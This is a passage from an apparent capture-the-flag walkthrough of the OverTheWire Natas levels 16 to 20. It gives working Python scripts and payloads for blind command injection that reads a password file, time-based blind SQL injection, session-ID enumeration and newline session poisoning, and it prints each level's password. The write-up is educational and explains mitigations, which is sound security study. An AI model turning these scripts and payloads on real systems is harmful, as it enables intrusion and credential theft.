This is where the vulnerability exists.

### Exploitation approach

Since we effectively have access to the **Shell**, we don’t need exotic PHP tricks. We can rely on **bash command substitution** using `$()`:

`$(grep ^a /etc/natas_webpass/natas17)`

- `^` means _“start of the line”_.

This works, but we still need a way to determine whether our guess is correct or not.

### Using the page logic as an indicator

The page normally searches for a word and prints results. We can use this behavior as both:

- an **anchor** (to keep the page working), and
    
- an **indicator** (to detect true/false conditions).
    

<img width="856" height="189" alt="Captura de pantalla 2026-01-05 051457" src="https://github.com/user-attachments/assets/826e7a10-d076-4d91-b891-99c3f29c746d" />


- We use the word **`Sunday`** as an anchor so the page behaves normally.

- Then we inject our command using `grep`.


**Logic:**

- If the page still prints results for `Sunday`, the guessed character is **wrong**.

- If the page returns **no output**, the guessed character **matches** the password.


This gives us a reliable boolean signal.

### Automation

Testing character by character manually would be extremely slow, so automation is required.

#### Python script

```
import requests
from requests.auth import HTTPBasicAuth
import string

# Configuración del objetivo
target_url = "http://natas16.natas.labs.overthewire.org/"
auth = HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

# Definimos el set de caracteres: letras minúsculas, mayúsculas y números
charset = string.ascii_letters + string.digits
password = ""

print("--- Iniciando extracción de contraseña ---")

# Las contraseñas de Natas suelen tener 32 caracteres
for i in range(32):
    for char in charset:
        payload = f'Sunday$(grep ^{password + char} /etc/natas_webpass/natas17)'
        
        try:
            response = requests.get(target_url, auth=auth, params={'needle': payload})
            
              
            if "Sunday" not in response.text:
                password += char
                print(f"[+] Carácter {i+1} encontrado: {char} -> {password}")
                break
        except Exception as e:
            print(f"Error en la conexión: {e}")

print(f"\n[!] Extracción completa. Contraseña: {password}")
```

## Solution

```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

## Important script concepts

### 🧩 Technical difference: `params` vs `data`

|Term|Used with|Where data goes|Technical reason|
|---|---|---|---|
|`params`|`requests.get()`|URL query string|HTTP defines GET requests as identifying queries via the URL|
|`data`|`requests.post()`|Request body|POST requests send content inside the body|

> **Rule of thumb for Natas**
> 
> - If PHP uses `$_GET` → use `params`
>    
> - If PHP uses `$_POST` → use `data`
>    

- In this script, **`grep`** naturally distinguishes between uppercase and lowercase letters, fulfilling the same role as `BINARY` in SQL injections.

## Application in real life

Everything learned in this challenge applies directly to real-world systems.

### 1. The danger of “bridge functions”

Developers often use functions like `passthru()`, `system()`, or `exec()` for convenience (e.g., compressing files or processing images).

- **Lesson:** Every time an application jumps from its language (PHP, Python, Node) to the system shell, a critical security gap opens. Without strict sanitization, that gap becomes full server compromise.
### 2. The invisibility fallacy (Blind attacks)

Many developers believe that hiding errors or outputs makes applications safe.

- **Lesson:** This level proves that visibility is not required. If an attacker can detect **any behavioral difference**, sensitive data can be extracted character by character.

### 3. Blind trust in user input

The most common real-world mistake is trusting user input.

- **Lesson:** User input must always be treated as **hostile**. Concatenating it directly into commands or queries is a fundamental security flaw.

### 4. “Mailboxes” matter (params vs data)

Understanding where data travels is crucial during audits.

- **Lesson:** Many attacks fail not because the payload is wrong, but because it is sent to the wrong place (URL vs body).

_______

# Level 17

- In this exercise, we return to **databases**, and in fact the application uses the **same code as Level 14–15**, with one very important exception:  
    when checking whether a user exists, the responses in the code are **commented out**. This makes the challenge harder because there is **no visible output** to tell us whether a condition is true or false.

<img width="879" height="699" alt="Captura de pantalla 2026-01-06 045945" src="https://github.com/user-attachments/assets/260aa4ee-f9d7-4d17-97de-6d6ecf243580" />


- My first approach was to try **`SELECT SLEEP(10)`** in order to use **time** as a factor to determine whether a request was correct or not, but this did not work as expected.

What took me the longest to fully understand was how to reapply the concept of an **anchor**, which I had already used in previous levels, but this time in a different context. The key insight was realizing that I already **know that `natas18` exists**, and I can use that fact as an **anchor**, while introducing a **timer-based condition** to verify each character of the password.

### Time-based condition

Let’s look at the payload that makes this possible:

`natas18" AND IF(BINARY SUBSTRING(password, 1, 1) = "a", SLEEP(7), 0)#`

- This payload means:
    
    - If the first character of the password is `"a"`, the database will **sleep for 7 seconds**
    - Otherwise, the response will be immediate


> In **SQL**, the function `SUBSTRING()` (or alternatively `LEFT()`) is used to **extract a specific number of characters** from a string, starting at a given position.

At this point, the logic is clear, but testing character by character manually would be impractical. The only viable solution is **automation**.

## Automation script

```
import requests
import string
import time
from requests.auth import HTTPBasicAuth

# --- CONFIGURACIÓN DEL OBJETIVO y CONFIGURAR AUTENTICACION ---

url = 'http://natas17.natas.labs.overthewire.org/'
auth = HTTPBasicAuth("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

# --- Mezclamos el charset. Las claves de Natas suelen ser alfanuméricas (A-Z, a-z, 0-9)


charset = string.ascii_letters + string.digits
password = ""

print("[+] Iniciando Blind SQL Injection de ALTA PRECISIÓN...")
print("[+] Objetivo: Extraer contraseña de natas18")
print("-" * 50)


for i in range(1, 33):
    found_char = False
    
    for char in charset:
        # --- Usamos BINARY para diferenciar mayúsculas de minúsculas
        # --- SLEEP(7) nos da un margen muy alto contra el lag de red normal
        
        #********************* PAYLOAD *********************************
        payload = f'natas18" AND IF(BINARY SUBSTRING(password, {i}, 1) = "{char}", SLEEP(7), 0)#'
        
        try:
            # --- Primera petición: El "sondeo" Medimos la primera solicitud
            
            start_time = time.time()
            response = requests.post(url, auth=auth, data={"username": payload}, timeout=20)
            
            # --- Usamos elapsed para mayor precisión del servidor
            
            duration = response.elapsed.total_seconds()
            
            # !!!!!!!!!!!!!!!! PRIMERA CONFIRMACION !!!!!!!!!!!!!!!!!!!!!!!
            if duration >= 6.5:
                # --- FASE DE DOBLE VERIFICACIÓN ---
                # --- Si detectamos un posible acierto, esperamos un poco y preguntamos de nuevo
                print(f"[*] ¿Es la '{char}'? (Tardó {duration:.2f}s). Verificando...")
                time.sleep(1) # Pausa de estabilidad
                
                
                
                confirm = requests.post(url, auth=auth, data={"username": payload}, timeout=20)
                confirm_duration = confirm.elapsed.total_seconds()
                
                # !!!!!!!!!!!!SEGUNDA CONFIRMACION!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                if confirm_duration >= 6.5:
                    # Si ambos intentos superan el umbral, la letra es CORRECTA y entonces se agrega a password
                    password += char
                    print(f"[!] POSICIÓN {i} CONFIRMADA: {char} -> {password}")
                    found_char = True
                    break
                else:
                    # Si la segunda fue rápida, era lag. Seguimos buscando en el charset.
                    print(f"[?] Falso positivo con '{char}' (Confirmación tardó {confirm_duration:.2f}s)")
            
        except requests.exceptions.RequestException:
            # Si hay un error de conexión, esperamos y reintentamos la misma letra
            print(f"[!] Error de conexión en '{char}'. Reintentando en 2 segundos...")
            time.sleep(2)
            continue

    if not found_char:
        print(f"\n[X] Error: No se pudo encontrar el carácter para la posición {i}.")
        print(f"Contraseña parcial obtenida: {password}")
        break

print("-" * 50)
print(f"[✔] PROCESO FINALIZADO")
print(f"[✔] La contraseña real de natas18 es: {password}")
```

### Script flow explained

This script takes a long time to run, and understanding its **control flow** is essential:

- **Layer 1 (Position loop):**
    
    - Initializes a control variable (`found_char = False`)
        
    - Prepares a final validation check (`if not found_char`)
        
- **Layer 2 (Character loop):**
    
    - Tests each character in the charset
        
    - If the character is correct:
        
        - `found_char` becomes `True`
            
        - `break` exits the inner loop immediately
            
- **Interaction and termination:**
    
    - When the inner loop breaks, execution returns to Layer 1
        
        - If `found_char == True`, the script continues with the next position
            
        - If `found_char == False`, the script concludes that no valid character was found and stops execution
            
- **Exception handling (`except requests.exceptions.RequestException`):**
    
    - If a network or connection error occurs, the script waits briefly and retries instead of failing completely
    
<img width="592" height="789" alt="Captura de pantalla 2026-01-06 210745" src="https://github.com/user-attachments/assets/56e4098d-840e-4568-8504-2327b85bc641" />



## Solution

```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```
## Application in real life

This exercise demonstrates a **Timing Attack**, a specific form of **Blind SQL Injection**. Even when an application does not reveal data directly, the **response time** of the server becomes a communication channel. By measuring these variations, an attacker can infer sensitive information character by character.

One of the most important lessons I learned here is that I could not expect a “perfect” 5- or 7-second delay to confirm a condition. In Natas 17, time is an **imprecise signal**. Every request is affected by network latency, server load, and environmental noise—exactly what happens in real-world systems.

The turning point was changing my mindset:  
I stopped looking for **exact times** and started observing **behavioral differences**. If a response consistently took _significantly longer_ than normal, the condition was true. This shift in thinking is crucial for understanding how time-based attacks actually work outside of controlled lab environments.

## Key phrases

> As a pentester, I don’t calculate exact timings; I identify time ranges that consistently break the system’s normal behavior.

> A time-based attack works by forcing the system into an abnormal execution path and observing whether the response becomes noticeably slower.

> I don’t measure precise time; I observe whether the response deviates from normal behavior.

____________

# Level 18

- This exercise presents a scenario where we work with **cookies** and, more importantly, **`$_SESSION`** (sessions in general). Let’s analyze the source code:

<img width="1010" height="611" alt="Pasted image 20260111145434" src="https://github.com/user-attachments/assets/211c6579-3d5b-4bb4-9af1-9f4ce1432f51" />

<img width="1140" height="630" alt="Captura de pantalla 2026-01-11 145752" src="https://github.com/user-attachments/assets/d17bebb3-abc2-426a-9af2-6479d3d394ba" />


- In the first part of the code, we identify three functions. Let’s go one by one:


`function isValidID($id) {      return is_numeric($id); }`

- This checks if `$id` is a numeric value. If it is, it returns `true`.


`function createID($user) {     global $maxid;     return rand(1, $maxid); }`

- The `$user` parameter is **not actually used**. The important part is `$maxid`, which defines the maximum value for the random ID.

- **`global $maxid;`** allows the function to access `$maxid` defined outside the function (in the global scope).

- `createID` generates a **random ID** between 1 and `$maxid` (in this case, 640).


`function debug($msg) {     if(array_key_exists("debug", $_GET)) {         print "DEBUG: $msg<br>";     } }`

    **`array_key_exists("debug", $_GET)`** checks if the URL includes a `debug` parameter (e.g., `page.php?debug=1`).

    **`print "DEBUG: $msg<br>";`** prints the message `$msg` on the webpage if the `debug` parameter exists.


- Moving forward, the next part of the code contains two **key functions**:


1. The first checks whether a session is connected. The **`else`** branch is crucial because it lets us detect whether the word **admin** exists in the session. This is critical later.

2. The second function displays the password **only if** the following condition is true:


`if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)`

- This checks: “First, does `admin` exist in the session? Second, is its value equal to `1`?”

- That’s why knowing whether `"admin"` exists in the current session is essential.

### Understanding `$_SESSION`

- **What is a session?**
    
    - An associative array where the page **stores user information between requests**.
    - For example, `$_SESSION["admin"]` is the flag indicating privilege.
    - It can also contain keys like `username` or `id`.
    
- **How a request works:**
    
    1. PHP checks your `PHPSESSID`.
    2. If it exists, it loads the corresponding `$_SESSION`.
    3. If not, it creates a new session.
    
- The page **reads and initializes values if needed** (e.g., `admin = 0`).
    
- The page **decides what to show** based on the session:
    
    - `admin == 1` → credentials
    - `admin == 0` → regular user message
    
- Every request depends on **maintaining a consistent session**.
    
    - Changing the `PHPSESSID` points you to a different session → different state → different evaluation of the `if`.
    

### Exploit strategy

- Knowing this, we can infer that **by changing the `PHPSESSID`**, we can reach the correct session where the password is displayed.
- We need a script that iterates through IDs from 1 to 640 until it finds the correct one:


```
import requests
from requests.auth import HTTPBasicAuth

url = "http://natas18.natas.labs.overthewire.org/"
username = "natas18"
password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"

print("inicio de ataque")

for i in range(1, 641):
    cookies = {"PHPSESSID": str(i)}
    response = requests.get(
        url,
        auth=HTTPBasicAuth(username, password),
        cookies=cookies
    )
    print(f"probando con {i}")

    if "You are an admin" in response.text:
        print(f"¡Encontrado! PHPSESSID = {i}")
        print(response.text)
        break
```

- After testing with **PHPSESSID = 119**, we successfully obtain the password:

```
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

## Application in real life and mitigation

- The vulnerability arises because the application uses **predictable and low-entropy session identifiers** (`PHPSESSID` between 1 and 640) and **relies exclusively on session state** (`$_SESSION["admin"]`) for authorization, without any additional validation tying the session to the authenticated user.

- This enables attacks such as:
    
    - **Broken Authentication**
        
    - **Broken Session Management**
        
    - **Privilege Escalation**
        

`An attacker does not need complex exploits; enumerating or predicting session identifiers is enough.`

- This exercise demonstrates that **poor session management can completely compromise an application**, even in the absence of traditional vulnerabilities like SQL Injection or XSS.
    

**Mitigation strategies:**

1. Session identifiers should be **cryptographically secure**, unpredictable, and not enumerable.
2. Session IDs should be **regenerated** upon login and privilege changes.
3. Authorization decisions must **never rely solely on session state** (`$_SESSION`) and should always be validated server-side.

________________

# Level 19

- This exercise presents essentially the same source code as the previous level, but with a small change: the server expects the session identifier to be **hex-encoded**, which does **not** provide real security.
    
<img width="504" height="94" alt="Captura de pantalla 2026-01-11 230443" src="https://github.com/user-attachments/assets/a9a823c8-f2f1-4378-974a-e440458bd411" />

<img width="704" height="870" alt="Captura de pantalla 2026-01-11 165105" src="https://github.com/user-attachments/assets/6c89ff92-913c-4854-a289-45391d8a5714" />


- This means that simply looping from 1 to 640 like in the previous level will **no longer work directly**, because we now need to account for the HEX encoding.
    
- Since the attack vector is still the **cookie**, we can reuse the previous script but adapt it to handle HEX encoding:


```
import requests
from requests.auth import HTTPBasicAuth

url = "http://natas19.natas.labs.overthewire.org/"
username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"

print("Inicio de ataque")

for i in range(1, 641):
    payload = f"{i}-admin"
    encriptado = payload.encode().hex()
    cookies = {"PHPSESSID": encriptado}
    response = requests.post(
        url,
        auth=HTTPBasicAuth(username, password),
        cookies=cookies
    )

    print(f"Probando con {payload}")

    if "You are an admin" in response.text:
        print(f"¡Encontrado! PHPSESSID = {i}")
        print(response.text)
        break
```

- This script works and produces the expected result:

<img width="808" height="415" alt="Captura de pantalla 2026-01-12 151429 1" src="https://github.com/user-attachments/assets/28bcc7ec-239e-44d5-918f-7ccc84b7f499" />


- To convert a value to HEX, we can use:

```
value = "281-admin" 
hex_encoded = value.encode().hex() 
print(hex_encoded)
```

- The output is:

```
3238312d61646d696e
```

- Entering this value as the cookie proves that it works:

<img width="1093" height="589" alt="Captura de pantalla 2026-01-12 150626" src="https://github.com/user-attachments/assets/66078615-d31c-452c-ac3a-62e6501d0bfa" />


- ✅ Password obtained:


```
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```
## Application in real life

- This exercise, like the previous one, highlights **highly vulnerable session identification** because the server **blindly trusts the PHPSESSID** to grant privileges.
    
- The only "protection" is HEX encoding, which is trivial to bypass.
    
- This can lead to serious vulnerabilities such as:
    
    - **Broken Authentication**
        
    - **Broken Session Management**
        
    - **Privilege Escalation**
        

`An attacker does not need complex exploits; simply enumerating or predicting session identifiers is enough.`

- This demonstrates that **poor session management alone can completely compromise an application**, even in the absence of traditional vulnerabilities like SQL Injection or XSS.


___________

# Level 20

- This exercise presents a scenario closer to **real-life situations**, where there are no obvious hints or payloads showing where the vulnerability is. It requires a **deep understanding of the source code** to spot subtle details that can have a major impact. Let's examine the code:

<img width="1728" height="769" alt="Pasted image 20260113210954" src="https://github.com/user-attachments/assets/00971555-308d-436e-a90f-cee412f02e33" />

<img width="838" height="747" alt="Captura de pantalla 2026-01-13 211634" src="https://github.com/user-attachments/assets/1afea8e6-2d25-4199-82d4-06fcaceb1a90" />

<img width="729" height="631" alt="Captura de pantalla 2026-01-13 211757" src="https://github.com/user-attachments/assets/5db7f850-1713-476b-b7a1-c0978c40fc6a" />

- I highlighted certain parts that are critical and will explain them step by step.
    
- First impressions and deductions:
    
    - I noticed that the **PHPSESSID** is always 26 characters long.

    - I identified the attack vector in:
    
    
    `$_SESSION["name"] = $_REQUEST["name"];`
    
    `This line allows us to influence the **$_SESSION** directly from the page input.`
    

### Key Concepts

This exercise introduces several critical concepts:

1. **How sessions (`$_SESSION`) work in PHP**  
    Understanding the structure of sessions, how they are created, and how they relate to each other is essential.  
    Reference: [PHP Sessions Tutorial](https://code.tutsplus.com/es/how-to-use-sessions-and-session-variables-in-php--cms-31839t)
    
2. **Serialization in PHP**  
    Serialization is key to managing session data in an organized way. It is also commonly used in real-world applications to persist state.  
    Reference: [PHP `serialize()` function](https://www.php.net/manual/es/function.serialize.php)
    
### Attack Analysis

- The crucial detail I initially ignored (thinking it was noise) turned out to be the **key to the solution**.
    
- Although serialization is generally important for session management, in this exercise, the application **does not use standard serialization**. Instead, it processes the session in a custom format:
    
    `'key' <space> 'value'`
    
- This is essential because our attack vector is the input that is **directly written into `$_SESSION`**:
    
    `$_SESSION["name"] = $_REQUEST["name"];`




### Step-by-Step Exploit

1. **Create our own PHPSESSID**
    
    - By testing, we confirmed that a 26-character string is accepted as a valid PHPSESSID.
    
2. **Create a new session**
    
    - Send a request with `?debug=` to confirm the session is created with the value `foo`.

3. **Inject our payload into the session**
    
    - URL format:
        
        `http://natas20.natas.labs.overthewire.org/?name=foo%0Aadmin%201`
        
        - `%0A` = newline (`\n`)
        - `%20` = space
        
    - Explanation: The page expects input in `'key' 'value'` format. By sending:
        
        `foo\nadmin 1`
        
        1. The `name` key is updated to `foo`.
        2. The `admin` key is set to `1`.
        
    - This satisfies the condition in `print_credentials()`.

3. **Reload the page**
    
    - Since the `admin` flag in the session is now set to `1`, the page prints the credentials.
        
<img width="1023" height="368" alt="Captura de pantalla 2026-01-13 221726" src="https://github.com/user-attachments/assets/231f3daa-0ae9-4477-b1a4-6337513950fc" />


- Highlighted in yellow: confirmation of the **session** and the **PHPSESSID**:
    

```
BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```
## Application in real life

- This level demonstrates a **Session Poisoning vulnerability**, caused by **poor session handling** without proper **validation or integrity checks**.
    
- The vulnerability arises from a **custom session management implementation**, where the state can be influenced directly by user input.
    
- When an attacker can modify the session in this way, they can **inject new state values** that alter application logic, leading to **privilege escalation without executing any code**.
    
- **Key takeaway:** Even if no SQL injection, XSS, or other typical vulnerabilities exist, **weak session management alone can compromise an entire system**.


_______________________________________








